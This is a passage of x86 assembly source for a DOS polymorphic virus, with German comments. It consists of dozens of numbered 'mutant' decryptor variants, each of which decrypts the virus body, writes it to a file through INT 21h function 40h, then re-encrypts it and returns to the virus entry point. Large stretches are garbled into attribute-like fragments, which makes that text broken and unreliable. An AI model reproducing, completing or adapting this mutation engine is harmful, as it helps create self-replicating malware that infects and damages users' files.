j03aad="" jmp="" short="" j03ac0="" ;="" si="4BB8" ;----------------------------------------------------="" j03ab8:="" sub="" ah,20h="" ;=""> AH = 40, WRITE FILE
                ;----------------( db-code )-------------------------
                Call_int21 3,MUT_3
                ;----------------
                JMP     J03A9B
                ;----------------------------------------------------
J03AC0:         SUB     SI,Offset D4BB5-4C40H ; SI = SI + 8Bh = 4C43h/D2433
                CMP     BYTE Ptr DS:[SI],01h
                JNZ     J03ACB
                POP     SI             ; originales SI vom Stack
                RETN

J03ACB:         PUSH    ES
                POP     DS
                ;----------------
J03ACD:         JMP_entry 3,mut_3
                ;----------------
;=====================================================================
;=====================================================( MUTANT #5 )===
;=====================================================================
MUT_5           EQU     $
J03AD0:         MOV     CX,0BD7h                ; CX = 0bd7 ; = OFFSET 4BB5
J03AD3:         XOR     WORD Ptr DS:[BX],4096h  ; also 11c3 mal, da BX um 3
                                                ; erh”ht wird
                ADD     BX,+03h
                LOOP    J03AD3
                MOV     AX,ES
                POP     AX
                MOV     BX,AX
                POP     CX
                MOV     AH,50h
                JMP     SHORT J03B04

J03AE6:         PUSH    SI
        ;--------( einsprung ) ------
J03AE7:         STD
                CALL    J03AED
                PUSH    CS
                DEC     DI
J03AED:         POP     DX                      ; DX =
                PUSH    CS
                SUB     DX,23A0h                ; DX =
                POP     DS
                MOV     CX,0BD7h                ; CX =
                XCHG    DX,SI                   ; SI =

J03AF9:         XOR     WORD Ptr DS:[SI],4096h
                ADD     SI,+03h
                LOOP    J03AF9
                JMP     SHORT J03B0C            ; SI =


J03B04:         SUB     AH,10h                  ; AH = 40h !
                CALL_INT21 5,MUT_5
                JMP     J03AE6

J03B0C:         SUB     SI,0FF72h                ; SI =
                CMP     BYTE Ptr DS:[SI],01h
                JNZ     J03B17
                POP     SI
                RETN

J03B17:         PUSH    ES
                POP     DS
J03B18:         JMP_ENTRY 5,mut_5
;=====================================================================
;===================================================( MUTANT # 20 )===
;=====================================================================
MUT_20          EQU     $
                CMC                             ; = OFFSET 4BB5
                CALL    J03B61                  ; CX = 11C3
J03B20:         XOR     WORD Ptr DS:[BX],0406h
                INC     BX
                ADD     BX,+01h
                CMC
                LOOP    J03B20
                POP     BX
                CMC
                POP     CX
                CALL_INT21 20,MUT_20
                PUSH    AX
                POP     AX
        ;--------( einsprung ) ------
                CALL    J03B5E                  ; DS <- 4bcf="" mov="" bx,cs="" push="" bx="" mov="" bx,ds="" ;="" bx=""></-><- ds,="" bx="4BCF" !="" pop="" ds="" ;="" ds="CS" add="" bx,0dc61h="" ;="" bx="2830" call="" j03b61="" ;="" cx="11C3" mov="" dx,0002h="" ;="" dx="2" j03b46:="" xor="" word="" ptr="" ds:[bx],0406h="" add="" bx,dx="" loop="" j03b46="" ;="" bx="4BB6" add="" bx,008dh="" ;="" bx="4C43" 2443="" push="" [bx]="" ;="" [bx]="[2443]" pop="" cx="" ;="" cx="?" dec="" cl="" ;="" cx="?" jz="" j03b60="" ;="" push="" es="" pop="" ds="" call_entry="" 20,mut_20="" j03b5e:="" pop="" ds="" push="" ds="" j03b60:="" retn="" j03b61:="" mov="" cx,1100h="" or="" cl,0c3h="" ;="" cx="11C3" retn="" ;="====================================================================" ;="==================================================(" mutant="" #="" 21="" )="==" ;="====================================================================" mut_21="" equ="" $="" call="" j03bae="" ;="" cx="11C3" j03b6b:="" xor="" word="" ptr="" ds:[bx],239ah="" add="" bx,+01h="" clc="" inc="" bx="" loop="" j03b6b="" pop="" bx="" cld="" pop="" cx="" call_int21="" 21,mut_21="" push="" dx="" inc="" dx="" pop="" dx="" ;--------(="" einsprung="" )="" ------="" call="" j03bab="" ;="" ds=""></-><- 4bcf="" mov="" bx,cs="" push="" bx="" mov="" bx,ds="" ;="" bx="4BCF" pop="" ds="" ;="" ds="CS" add="" bx,0dc61h="" ;="" bx="2830" call="" j03bae="" ;="" cx="11C3" mov="" ax,0002h="" ;="" ax="0002" j03b92:="" xor="" word="" ptr="" ds:[bx],239ah="" nop="" add="" bx,ax="" loop="" j03b92="" add="" bx,008dh="" ;="" bx="4BB6" push="" [bx]="" pop="" bx="" dec="" bl="" ;="" cmp="" byte="" ptr="" ds:[4c43],1="" jz="" j03bad="" push="" es="" pop="" ds="" call_entry="" 21,mut_21="" ;-------------------="" j03bab:="" pop="" ds="" push="" ds="" j03bad:="" retn="" j03bae:="" mov="" cx,0c311h="" ;="" mov="" cx,11c3="" xchg="" ch,cl="" ;="" ret="" retn="" ;="====================================================================" ;="==================================================(" mutant="" #="" 22="" )="==" ;="====================================================================" mut_22="" equ="" $="" call="" j03bf9="" ;="" cx="11C3" j03bb7:="" xor="" word="" ptr="" ds:[bx],0138h="" add="" bx,+02h="" loop="" j03bb7="" pop="" bx="" clc="" pop="" cx="" call_int21="" 22,mut_22="" jmp="" short="" j03bcb="" db="" 23h,87h,0ch="" ;--------(="" einsprung="" )="" ------="" j03bcb:="" call="" j03bf6="" ;="" ds=""></-><- mov="" bx,cs="" push="" ds="" ;="" ds="CS" mov="" ds,bx="" pop="" bx="" ;="" bx="SUB" bx,239fh="" ;="" bx="CALL" j03bf9="" ;="" cx="11C3" mov="" ax,0002h="" ;="" ax="0002" j03bde:="" xor="" word="" ptr="" ds:[bx],0138h="" add="" bx,ax="" loop="" j03bde="" add="" bx,008dh="" ;="" bx="PUSH" [bx]="" pop="" bx="" dec="" bl="" ;="" jz="" j03bf8="" push="" es="" pop="" ds="" jmp_entry="" 22,mut_22="" j03bf6:="" pop="" ds="" push="" ds="" j03bf8:="" retn="" j03bf9:="" mov="" cx,0c311h="" ;="" mov="" cx,11c3="" xchg="" cl,ch="" ;="" ret="" retn="" db="" 0cch="" ;="====================================================================" ;="==================================================(" mutant="" #="" 23="" )="==" ;="====================================================================" mut_23="" equ="" $="" xchg="" cl,ch="" ;="OFFSET" 4bb5="" xor="" cx,94e0h="" ;="" cx="2385" -=""> 8523 -> 11c3
J03C06:         INC     BX
                ADD     WORD Ptr DS:[BX],00FEh
                INC     BX
                LOOP    J03C06
                MOV     AX,DX
                POP     DX
                MOV     BX,DX
                POP     CX
                PUSH    AX
                JMP     SHORT J03C42

        ;--------( einsprung ) ------
J03C17:         CALL    J03C1B
J03C1A:         RETN

J03C1B:         MOV     BX,0DC61h               ; BX =
                POP     CX                      ; CX =
                ADD     BX,CX                   ; BX =
                PUSH    CS
                MOV     CX,11C4h                ; CX =
                POP     DS                      ; DS =
                DEC     CL                      ; CX = 11C3
J03C28:         INC     BX
                SUB     WORD Ptr DS:[BX],00FEh
                INC     BX
                LOOP    J03C28
                PUSH    SI                      ; BX =
                MOV     SI,BX                   ; SI =
                ADD     SI,008Dh                ; SI =
                DEC     BYTE Ptr DS:[SI]        ;
                POP     SI
                JZ      J03C1A
                PUSH    ES
                CLC
                POP     DS
                JMP_ENTRY 23,mut_23

J03C42:         POP     DX
                MOV     AL,40h
                XCHG    AH,AL                   ; AH = 40h !!!!!!!
J03C47:
                CALL_INT21 23,MUT_23
                JMP     J03C17
END_23:
;=====================================================================
;===================================================( MUTANT # 27 )===
;=====================================================================
MUT_27          EQU     $
                SUB     CH,12h                  ; = OFFSET 4BB5
                ADD     CL,3Eh                  ; cx=2385 -> 11c3
J03C52:         ADD     [BX],CX
                ADD     BX,+04h
                SUB     BX,+02h
                LOOP    J03C52
                XCHG    BP,BX
                POP     BP
                XCHG    BX,BP
                JMP     SHORT J03C8D

        ;--------( einsprung ) ------
J03C63:         CALL    J03C67
J03C66:         RETN

J03C67:         POP     CX
                MOV     BX,0DC61h
                ADD     BX,CX
                PUSH    CS
                MOV     CX,10C3h
                POP     DS
                INC     CH
J03C74:         SUB     [BX],CX
                INC     BX
                STC
                INC     BX
                LOOP    J03C74
                MOV     BP,BX
                ADD     BP,008Dh
                DEC     BYTE PTR [BP+00h]
                POP     BP
                JZ      J03C66
                PUSH    ES
                POP     DS
                JMP_ENTRY 27,mut_27

J03C8D:         POP     CX
                PUSH    BP
                MOV     BP,2567h
                INC     BP

J03C93:

                CALL    DS:BP
                JMP     J03C63
;=====================================================================
;===================================================( MUTANT # 24 )===
;=====================================================================
Mut_24          EQU     $
                ADD     CX,0EE3Eh               ; = OFFSET 4BB5
                JMP     SHORT J03CA7
                db      43h
J03C9F:         NEG     WORD Ptr DS:[BX]
                ADD     BX,+02h
                LOOP    J03C9F
J03CA6:         RETN

J03CA7:         CALL    J03C9F
                CALL    J03CCE

                DB      0EAH
                DB      12H

        ;--------( einsprung ) ------
J03CAF:         PUSH    AX
                CALL    J03CDD
                ADD     DX,0DC60h
                MOV     CH,11h
                MOV     CL,0C3h
                XCHG    BX,CX
                CALL    J03C9F
                TEST    BYTE Ptr DS:[D2433],0FEh
                JZ      J03CA6
                MOV     CX,ES
                MOV     DS,CX
                CALL_ENTRY 24,mut_24
                ;-------------------
J03CCE:         POP     CX
                POP     AX
                XCHG    AX,BX
                POP     AX
                XCHG    AX,CX
                MOV     AH,3Fh
                INC     AH
                CALL_INT21 24,mut_24
                POP     AX
                JMP     J03CAF

J03CDD:         MOV     BX,CS
J03CDF:         MOV     DS,BX
                POP     DX
                PUSH    DX
                RETN
;=====================================================================
;====================================================( MUTANT # 28)===
;=====================================================================
mut_28          EQU     $
                XOR     CX,3246h                ; = OFFSET 4BB5
                JMP     SHORT J03CF3

J03CEA:         XOR     [BX],CX
                ADD     BX,+03h
                DEC     BX
                LOOP    J03CEA
J03CF2:         RETN

J03CF3:         CALL    J03CEA
                CALL    J03D18
J03CF9:         XCHG    BL,BH
        ;--------( einsprung ) ------
                CALL    J03D29
                XCHG    DX,BX
                ADD     BX,0DC61h
                MOV     CX,ZweiByte
                CALL    J03CEA
                TEST    BYTE Ptr DS:[D2433],0FEh
                JZ      J03CF2
                MOV     DX,ES
                MOV     DS,DX
                JMP_ENTRY 28,mut_28

J03D18:         POP     AX
                POP     AX
                MOV     BX,AX
                POP     AX
                MOV     CX,AX
                XOR     AH,AH
                OR      AH,40h          ; AH = 40h
                CALL_INT21 28,mut_28
                JMP     J03CF9

J03D29:         MOV     BX,CS
J03D2B:         MOV     DS,BX
                POP     DX
                PUSH    DX
                RETN
;=====================================================================
;====================================================( MUTANT # 26)===
;=====================================================================
mut_26          EQU     $
                SUB     BX,+02h                 ; = OFFSET 4BB5
                ADD     CX,0EE3Ch
                MOV     AX,[BX]
J03D39:         INC     BX
                INC     BX
                SUB     [BX],AX
                LOOP    J03D39
                POP     BX
                XLAT                            ; MOV AL,[BX+AL]
                POP     CX
                JMP     SHORT J03D6C

J03D44:         POP     BX
                PUSH    BX
J03D46:         RETN

        ;--------( einsprung ) ------
J03D47:         PUSH    CS
                POP     DS
                CALL    J03D44
                ADD     BX,0DC5Dh
                MOV     CX,11C1h
                MOV     AX,[BX]
J03D55:         INC     BX
                INC     BX
                ADD     [BX],AX
                LOOP    J03D55
                ADD     BX,0092h
                CMP     BYTE Ptr DS:[BX+01h],01h
                JZ      J03D46
                PUSH    ES
                AND     AX,CX
                POP     DS
                CALL_ENTRY 26,mut_26
                ;-------------------
J03D6C:         MOV     AH,30h
                ADD     AH,10h

                PUSH    SI
                MOV     SI,1466h
                CALL    [SI+1100h]      ; CALL INT 21h
                POP     SI
                JMP     J03D47

;=====================================================================
;=====================================================( MUTANT #1 )===
;=====================================================================
MUT_1           EQU     $
                SUB     CX,11C4h                ; = OFFSET 4BB5
                SUB     BX,+02h
                MOV     AX,[BX]
J03D85:         INC     BX
                INC     BX
                SUB     [BX],AX
                LOOP    J03D85
                POP     BX
                POP     CX
                JMP     SHORT J03DB9

J03D8F:         POP     BX
                CLD
                PUSH    BX
J03D92:         RETN
        ;--------( einsprung ) ------
J03D93:         PUSH    CS
                POP     DS
                CALL    J03D8F                  ; BX =
J03D98:         SUB     BX,23A3h                ; BX =
                MOV     CX,11C1h                ; CX =
                MOV     DX,[BX]
J03DA1:         INC     BX
                INC     BX
                ADD     [BX],DX
                LOOP    J03DA1
                PUSH    BP
                MOV     BP,0433h
                CMP     BYTE PTR [BP+2000h],01h ; [2433]
                POP     BP
                JZ      J03D92                  ; AUSGANG !
                PUSH    ES
                POP     DS
                CALL_ENTRY 1,mut_1
                ;-----------------
J03DB9:         MOV     AH,20h
                ADD     AH,AH                   ; AH = 40h => Schreiben !!!!!!

                MOV     BP,2466h
                CALL    CS:[BP+0100h]           ; CALL Int 21h !
                JMP     J03D93
                DB      89H

;=====================================================================
;====================================================( MUTANT #17 )===
;=====================================================================
MUT_17          EQU     $
                xor     ax,ax                   ; = OFFSET 4BB5
                ADD     CX,BX
J03DCC:         MOV     AL,[BX]
                SUB     [BX-01],AL
                SUB     BX,+02h
                CMP     BX,+1Fh
                JNZ     J03DCC
                POP     BX
                CLD
                POP     CX
                CALL    J03E04                  ; = JMP 3E04
        ;--------( einsprung ) ------
J03DDF:         PUSH    CS
                STD
                POP     DS
                POP     AX                      ; AX =
                CALL    J03E11                  ; AX =
                XCHG    AX,BX                   ; BX =
                MOV     CX,ZweiByte             ; CX =
                SUB     BX,+1Eh                 ; BX =

J03DED:         MOV     DL,[BX]
                ADD     [BX-01h],DL
                DEC     BX                      ; (!!!!!)
                CMC
                DEC     BX
                LOOP    J03DED
                                        ; BX =
                CMP     BYTE Ptr DS:[D2433],01h
                JZ      J03E13
                PUSH    ES
                CMC
                POP     DS
                CALL_ENTRY 17,mut_17

J03E04:         POP     AX
                XOR     AH,AH
                OR      AH,40h                  ; AH = 40h, SCHREIBEN

                CALL    DS:[@INT21]   ; CALL INT 21h
                CALL    J03DDF
J03E11:         POP     AX
                PUSH    AX
J03E13:         RETN
;=====================================================================
;====================================================( MUTANT # 16)===
;=====================================================================
MUT_16          EQU     $
                ADD     BX,CX                   ; = OFFSET 4BB5
                MOV     CX,0001h
                INC     CX                      ; CX = 2
J03E1A:         MOV     AL,[BX]
                ADD     [BX-01h],AL
                SUB     BX,CX
                CMP     BX,+1Fh
                JNZ     J03E1A
                POP     BX
                POP     CX
                CALL    J03E4F
        ;--------( einsprung ) ------
J03E2B:         POP     BX                      ; BX =
                PUSH    CS
                POP     DS
                CALL    J03E5C                  ; AX =

                XCHG    AX,BX                   ; AX =
                SUB     BX,+1Dh                 ; BX =
                MOV     CX,ZweiByte             ; CX =

J03E38:         MOV     AL,[BX]
                SUB     [BX-01h],AL
                DEC     BX
                DEC     BX
                LOOP    J03E38
                                        ; BX =
                CMP     BYTE Ptr DS:[D2433],01h
                JZ      J03E5E
                PUSH    ES
                SUB     AX,AX
                POP     DS
                CALL_ENTRY 16,mut_16
;----------------------------------------------------------------------
J03E4F:         POP     AX
                MOV     AH,40h                  ; AH = 40h

                PUSH    SI
                MOV     SI,Offset @INT21+2       ; Schreiben ? Int 21h ?
J03E56:         CALL    SI
                POP     SI
                CALL    J03E2B
J03E5C:         POP     AX
                PUSH    AX
J03E5E:         RETN
                DB      0ebh
;=====================================================================
;===================================================( MUTANT # 18 )===
;=====================================================================
mut_18          EQU     $
J03E60:         NOT     BYTE Ptr DS:[BX]        ; = OFFSET 4BB5
                NEG     BYTE Ptr DS:[BX]
                ADD     BX,+01h
                LOOP    J03E60
                POP     BX
                CLD
                POP     CX
                CALL_INT21 18,mut_18
                JMP     SHORT J03E78

J03E71:         MOV     DX,CS
                MOV     DS,DX
                CALL    J03E7B
        ;--------( einsprung  ist $-1 )-------
        ; ADD BH,DL
        ; JMP J03E71
        ;-------------------------------------

J03E78:         XLAT                            ; MOV AL,[BX+AL]
                JMP     J03E71

J03E7B:         POP     DX                      ; DX =
                SUB     DX,239Dh                ; DX =
                STC
                XCHG    BX,DX                   ; BX =
                MOV     CX,CODE_LEN XOR 0F0FH   ; CX =
                CLC
                XOR     CX,0F0Fh                ; CX =
J03E8B:         NEG     BYTE Ptr DS:[BX]
                NOT     BYTE Ptr DS:[BX]
                INC     BX
                STD
                LOOP    J03E8B
                                        ; BX =
                MOV     CH,8Dh          ; CX =
                MOV     AL,01h
                ADD     AL,CH           ;
                XLAT                    ; MOV AL,[BX+AL] ; AL = []
                CLC
                CMP     AL,01h
                JZ      J03E56  ;-<>>--< zeigt="" auf="" l0l0l0="">-----<>>--

                MOV     CX,ES
                MOV     AX,SS

                SUB     AX,AX                   ; AX <- 0="" push="" ds="" mov="" ds,cx="" ;="" ds=""></-><- es="" pop="" cx="" ;="" cx=""></-><- ds="" jmp_entry="" 18,mut_18="" ;="====================================================================" ;="===================================================(" mutant="" #30="" )="==" ;="====================================================================" mut_30="" equ="" $="" j03eac:="" neg="" byte="" ptr="" ds:[bx]="" ;="OFFSET" 4bb5="" not="" byte="" ptr="" ds:[bx]="" inc="" bx="" loop="" j03eac="" pop="" cx="" pop="" bx="" xchg="" cx,bx="" call_int21="" 30,mut_30="" jmp="" short="" j03ec3="" j03ebc:="" mov="" ax,cs="" mov="" ds,ax="" call="" j03ec5="" ;="" ;-------(="" einsprung="" )--------------="" j03ec3:="" jmp="" j03ebc="" j03ec5:="" pop="" ax="" ;="" ax="SUB" ax,239ch="" ;="" ax="XCHG" ax,bx="" ;="" bx="MOV" cx,code_len="" xor="" 0fdabh="" ;="" xor="" cx,0fdabh="" ;="" cx="2385" j03ed1:="" not="" byte="" ptr="" ds:[bx]="" neg="" byte="" ptr="" ds:[bx]="" inc="" bx="" loop="" j03ed1="" ;="" bx="MOV" al,8eh="" xlat="" ;="" mov="" al,[bx+al];="" al="[]" cmp="" al,01h="" jz="" j03ef2="" mov="" ax,es="" mov="" bx,ax="" ;="" bx=""></-><- es="" push="" ds="" mov="" ds,bx="" ;="" ds=""></-><- es="" pop="" bx="" ;="" bx=""></-><- ds="" sub="" ax,ax="" ;="" ax=""></-><- 0="" jmp_entry="" 30,mut_30="" ;--------------------------------------------------------="" dw="" 8903h,0a5efh,0cc14h="" j03ef2:="" ret="" dw="" 0c111h,0b4deh="" ;="====================================================================" ;="====================================================(" mutant="" #="" 8)="==" ;="====================================================================" mut_8="" equ="" $="" push="" bp="" ;="OFFSET" 4bb5="" inc="" bx="" dec="" cx="" call="" j03f06="" j03efe:="" dec="" cx="" neg="" byte="" ptr="" ds:[bx]="" add="" bx,+02h="" dec="" cx="" j03f05:="" retn="" j03f06:="" pop="" bp="" ;="" bp="J03F07:" call="" j03efe="" jz="" j03f3c="" jmp="" j03f07="" j03f0e:="" push="" bp="" ;-------(="" einsprung="" )--------------="" push="" cs="" j03f10:="" clc="" pop="" ds="" ;="" ds="CS" call="" j03f38="" ;="" bp="OFFSET" $+3="" j03f15:="" mov="" cl,84h="" ;="" cx="xx84" sub="" bp,23a1h="" ;="" bp="2831" mov="" bx,bp="" ;="" bx="2831" mov="" ch,23h="" ;="" cx="2384" j03f1f:="" call="" j03efe="" jnz="" j03f1f="" ;="LOOP" 3f1f="" mov="" ax,bp="" ;="" ax="BP=2831" mov="" bp,bx="" ;="" bx="4C00" add="" bp,008eh="" ;="" bp="DEC" byte="" ptr="" [bp+00h]="" ;="" pop="" bp="" ;="" bp="egal" jz="" j03f05="" ;="RET" push="" es="" pop="" ds="" push="" ax="" ;="" ax="2831" mov="" ax,cx="" ;="" ax="0" j03f38:="" pop="" bp="" ;="" bp="2831" push="" cs="" push="" bp="" retf="" ;="" jmp="" far="" cs:2830="" j03f3c:="" pop="" bp="" pop="" bx="" pop="" cx="" call_int21="" 8,mut_8="" jmp="" j03f0e="" ;="====================================================================" ;="====================================================(" mutant="" #7="" )="==" ;="====================================================================" mut_7="" equ="" $="" inc="" bx="" ;="OFFSET" 4bb5="" push="" dx="" dec="" cx="" j03f47:="" call="" j03f52="" j03f4a:="" not="" byte="" ptr="" ds:[bx]="" dec="" cx="" add="" bx,+02h="" dec="" cx="" retn="" j03f52:="" pop="" dx="" j03f53:="" call="" j03f4a="" jz="" j03f86="" jmp="" j03f53="" j03f5a:="" push="" dx="" ;-------(="" einsprung="" )--------------="" push="" cs="" j03f5c:="" pop="" ds="" call="" j03f83="" ;="" dx="J03F60:" sub="" dx,23a0h="" ;="" dx="MOV" bx,dx="" ;="" bx="MOV" cx,8423h="" xchg="" cl,ch="" ;="" cx="2384" j03f6b:="" call="" j03f4a="" jnz="" j03f6b="" ;="" loop="" xchg="" ax,dx="" ;="" ax="MOV" dx,bx="" ;="" bx="," dx="BX" add="" dx,008eh="" ;="" dx="XCHG" dx,bx="" ;="" bx="," dx="DEC" byte="" ptr="" ds:[bx]="" pop="" dx="" ;="" dx="????" jz="" j03f85="" push="" es="" pop="" ds="" ;="" ds="ES" push="" ax="" xor="" ax,ax="" ;="" ax="0" j03f83:="" pop="" dx="" ;="" dx="PUSH" dx="" j03f85:="" retn="" ;="" jmp="" 2831="" ;---------------------------------------------------------------="" j03f86:="" pop="" dx="" ;="" pop="" bx="" pop="" cx="" j03f89:="" call_int21="" 7,mut_7="" xlat="" ;="" mov="" al,[bx+al]="" clc="" j03f8e:="" jmp="" j03f5a="" ;="====================================================================" ;="==================================================(" mutant="" #="" 12="" )="==" ;="====================================================================" mut_12="" equ="" $="" jmp="" short="" j03fa0="" ;="OFFSET" 4bb5="" j03f92:="" pop="" bx="" mov="" ah,40h="" pop="" cx="" call_int21="" 12,mut_12="" ;="=========================================================" j03f99:="" jmp="" short="" j03fa7="" j03f9b:="" pop="" bx="" push="" cs="" pop="" ds="" push="" bx="" retn="" j03fa0:="" call="" j03fcc="" jnz="" j03fa0="" jmp="" j03f92="" ;-------(="" einsprung="" )--------------="" j03fa7:="" call="" j03f9b="" j03faa:="" mov="" cx,239fh="" ;="" bx=";" ds="CS" sub="" bx,cx="" ;="" cx="SUB" cx,+1ah="" ;="" cx="J03FB2:" call="" j03fcc="" jnz="" j03fb2="" xor="" byte="" ptr="" ds:[bx+008eh],01h="" jz="" j03fcb="" call="" j03f9b="" j03fc1:="" sub="" bx,23b4h="" ;="" bx="," bx=""></-><- dec="" bx="" ;="" bx="MOV" ax,cx="" push="" bx="" ;="" push="" es="" pop="" ds="" j03fcb:="" retn="" ;="JMP" 2831="" j03fcc:="" push="" [bx]="" pop="" ax="" xor="" [bx+02h],al="" xor="" [bx+01h],al="" add="" bx,+03h="" sub="" cx,+03h="" retn="" ;="====================================================================" ;="==================================================(" mutant="" #="" 11="" )="==" ;="====================================================================" mut_11="" equ="" $="" jmp="" short="" j03fec="" ;="OFFSET" 4bb5="" j03fde:="" pop="" bx="" pop="" cx="" mov="" ah,40h="" call_int21="" 11,mut_11="" jmp="" short="" j03ff3="" j03fe7:="" pop="" bx="" push="" bx="" push="" cs="" pop="" ds="" j03feb:="" retn="" j03fec:="" call="" j04019="" jnz="" j03fec="" jmp="" j03fde="" ;-------(="" einsprung="" )--------------="" j03ff3:="" call="" j03fe7="" j03ff6:="" mov="" ax,239fh="" ;="" bx="SUB" bx,ax="" ;="" bx="MOV" cx,001ah="" ;="" cx="XOR" cx,ax="" ;="" cx="2385" j04000:="" call="" j04019="" jnz="" j04000="" xor="" byte="" ptr="" ds:[bx+008eh],01h="" jz="" j03feb="" call="" j03fe7="" j0400f:="" sub="" bx,23b7h="" ;="" bx=""></-><- push="" bx="" ;="" ret="" push="" es="" mov="" ax,cx="" pop="" ds="" retn="" j04019:="" mov="" ah,[bx]="" xor="" [bx+01h],ah="" xor="" [bx+02h],ah="" add="" bx,+03h="" sub="" cx,+03h="" retn="" ;="====================================================================" ;="===================================================(" mutant="" #="" 14)="==" ;="====================================================================" mut_14="" equ="" $="" jmp="" short="" j04042="" ;="OFFSET" 4bb5="" j0402a:="" pop="" ax="" mov="" bx,ax="" pop="" ax="" push="" si="" mov="" cx,ax="" push="" word="" ptr="" ds:[@int21]="" mov="" ax,4000h="" ;="" schreiben="" !="" pop="" si="" call="" si="" ;="" call="" int="" 21h="" pop="" si="" stc="" nop="" clc="" ;-------(="" einsprung="" )--------------="" jmp="" j04049="" j04042:="" inc="" byte="" ptr="" ds:[bx]="" inc="" bx="" loop="" j04042="" jmp="" j0402a="" j04049:="" call="" j0406e="" mov="" cx,code_len="" sub="" bx,23a9h="" j04053:="" dec="" byte="" ptr="" ds:[bx]="" inc="" bx="" loop="" j04053="" push="" bp="" mov="" bp,bx="" add="" bp,008eh="" xor="" ax,ax="" cmp="" byte="" ptr="" [bp+00h],01h="" pop="" bp="" jz="" j04072="" push="" es="" pop="" ds="" jmp_entry="" 14,mut_14="" j0406e:="" push="" cs="" j0406f:="" pop="" ds="" pop="" bx="" push="" bx="" j04072:="" retn="" db="" 0cdh="" ;="====================================================================" ;="===================================================(" mutant="" #="" 10)="==" ;="====================================================================" mut_10="" equ="" $="" push="" ax="" dec="" cl="" jmp="" short="" j0408f="" j04079:="" mov="" al,[bx]="" inc="" bx="" mov="" ah,[bx]="" xchg="" al,ah="" mov="" [bx-01h],al="" dec="" cx="" mov="" [bx],ah="" inc="" bx="" xor="" ax,ax="" dec="" cx="" j0408a:="" retn="" ;-------(="" einsprung="" )--------------="" j0408b:="" push="" cs="" pop="" ds="" jmp="" short="" j040a2="" j0408f:="" call="" j04079="" clc="" jnz="" j0408f="" pop="" ax="" pop="" bx="" pop="" cx="" push="" bp="" push="" word="" ptr="" ds:[@int21]="" pop="" bp="" call="" ds:bp="" ;="" call="" int="" 21h="" pop="" bp="" j040a2:="" call="" j040a5="" j040a5:="" mov="" cx,2384h="" ;="" cx="2384" pop="" bx="" ;="" bx="40A5" sub="" bx,23b6h="" ;="" bx="1cef" j040ad:="" call="" j04079="" jnz="" j040ad="" cmp="" byte="" ptr="" ds:[bx+008fh],01h="" cld="" jz="" j0408a="" push="" es="" j040bb:="" pop="" ds="" jmp_entry="" 10,mut_10="" db="" 089h="" ;="====================================================================" ;="===================================================(" mutant="" #="" 29)="==" ;="====================================================================" mut_29="" equ="" $="" dec="" cx="" ;="OFFSET" 4bb5="" push="" ax="" jmp="" short="" j040db="" j040c4:="" mov="" al,[bx]="" inc="" bx="" mov="" ah,[bx]="" xchg="" ah,al="" mov="" [bx-01h],al="" mov="" [bx],ah="" inc="" bx="" xor="" ax,ax="" sub="" cx,+02h="" j040d6:="" retn="" ;-------(="" einsprung="" )--------------="" j040d7:="" push="" cs="" pop="" ds="" jmp="" short="" j040f0="" j040db:="" call="" j040c4="" jnz="" j040db="" pop="" ax="" pop="" bx="" sti="" pop="" cx="" push="" word="" ptr="" ds:[@int21]="" pop="" word="" ptr="" ds:[d259a]="" call="" word="" ptr="" ds:[d259a]="" ;="" call="" int="" 21h="" j040f0:="" call="" j040f3="" j040f3:="" pop="" bx="" ;="" bx="SUB" bx,23b8h="" ;="" bx="MOV" cx,2384h="" ;="" cx="2384" j040fb:="" call="" j040c4="" jnz="" j040fb="" cmp="" byte="" ptr="" ds:[bx+008fh],01h="" jz="" j040d6="" j04107:="" push="" es="" pop="" ds="" jmp_entry="" 29,mut_29="" ;="====================================================================" ;="===================================================(" mutant="" #="" 15)="==" ;="====================================================================" mut_15="" equ="" $="" push="" dx="" ;="OFFSET" 4bb5="" mov="" dh,[bx-01h]="" push="" ax="" j04111:="" mov="" dl,[bx]="" dec="" dh="" xor="" [bx],dh="" xchg="" dh,dl="" add="" bx,+01h="" loop="" j04111="" pop="" cx="" pop="" ax="" jmp="" j04128="" ;-------(="" einsprung="" )--------------="" j04123:="" call="" j04126="" j04126:="" jmp="" short="" j04135="" j04128:="" mov="" dx,ax="" pop="" ax="" mov="" bx,ax="" pop="" ax="" xchg="" ax,cx="" call="" ds:[@int21]="" ;="" call="" int="" 21="" jmp="" j04123="" j04135:="" pop="" bx="" ;="" bx="MOV" cx,code_len="" ;="" cx="2385" push="" cs="" sub="" bx,239fh="" ;="" bx="POP" ds="" j0413f:="" mov="" al,[bx-01h]="" dec="" al="" xor="" [bx],al="" inc="" bx="" loop="" j0413f="" cmp="" byte="" ptr="" ds:[bx+008eh],01h="" ;="" jnz="" j04151="" retn="" j04151:="" push="" es="" xor="" ax,ax="" pop="" ds="" jmp_entry="" 15,mut_15="" ;="====================================================================" ;="====================================================(" mutant="" #6="" )="==" ;="====================================================================" mut_6="" equ="" $="" dec="" cl="" ;="OFFSET" 4bb5="" j0415a:="" xor="" byte="" ptr="" ds:[bx],67h="" inc="" bx="" dec="" cx="" inc="" bx="" dec="" cx="" jnz="" j0415a="" push="" word="" ptr="" ds:[@int21]="" pop="" word="" ptr="" ds:[d2598+1]="" pop="" bx="" pop="" cx="" jmp="" short="" j04172="" ;-------(="" einsprung="" )--------------="" j0416f:="" call="" j041a1="" j04172:="" call="" word="" ptr="" ds:[d2598+1]="" ;="=" call="" int="" 21="" jmp="" j0416f="" j04178:="" mov="" ax,0002h="" ;="" ax="0002" add="" bx,0dd61h="" ;="" bx="DEC" bh="" ;="" bx="MOV" cx,2184h="" ;="" cx="2184" push="" cs="" xor="" ch,al="" ;="" cx="2386" pop="" ds="" j04188:="" xor="" byte="" ptr="" ds:[bx],67h="" dec="" cx="" add="" bx,ax="" ;="" jedes="" 2="" byte="" verxoren="" dec="" cx="" jnz="" j04188="" ;="" 11c3="" (!!!)="" mal="" :)="" add="" bx,008fh="" ;="" bx="DEC" byte="" ptr="" ds:[bx];="" push="" es="" pop="" ds="" jnz="" j0419c="" ;=""></-><- bx+8e="" retn="" j0419c:="" mov="" ax,cx="" jmp_entry="" 6,mut_6="" j041a1:="" pop="" bx="" jmp="" j04178="" ;="====================================================================" ;="===================================================(" mutant="" #="" 25)="==" ;="====================================================================" mut_25="" equ="" $="" dec="" cx="" ;="OFFSET" 4bb5="" j041a5:="" xor="" byte="" ptr="" ds:[bx],0e8h="" add="" bx,+02h="" sub="" cx,+02h="" jnz="" j041a5="" pop="" bx="" push="" word="" ptr="" ds:[@int21]="" pop="" word="" ptr="" ds:[d2598]="" jmp="" short="" j041be="" ;-------(="" einsprung="" )--------------="" j041bb:="" call="" j041ec="" j041be:="" pop="" cx="" call="" [d2598]="" jmp="" 